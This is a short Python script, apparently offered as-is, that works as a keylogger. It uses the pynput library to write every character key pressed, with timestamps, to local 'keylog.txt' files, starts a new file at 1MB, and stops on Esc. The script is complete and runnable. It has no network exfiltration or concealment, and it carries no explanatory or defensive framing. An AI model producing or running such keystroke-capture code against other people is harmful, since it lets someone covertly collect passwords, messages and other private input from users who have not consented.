from pynput.keyboard import Key, Listener
from datetime import datetime
import os

log_file = "keylog.txt"
max_file_size = 1024 * 1024  # 1MB

# Function to handle key press events
def on_press(key):
    try:
        # Get the current timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Log the pressed key with timestamp
        with open(log_file, "a") as file:
            file.write(f"[{timestamp}] {str(key.char)}\n")
        
        # Check the log file size
        if os.path.getsize(log_file) >= max_file_size:
            create_new_log_file()

    except AttributeError:
        # Ignore special characters or non-character keys
        pass

# Function to handle key release events
def on_release(key):
    # Exit the program when a specific key (e.g., Esc) is released
    if key == Key.esc:
        return False

# Function to create a new log file
def create_new_log_file():
    global log_file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"keylog_{timestamp}.txt"

# Create a listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the listener
    listener.join()
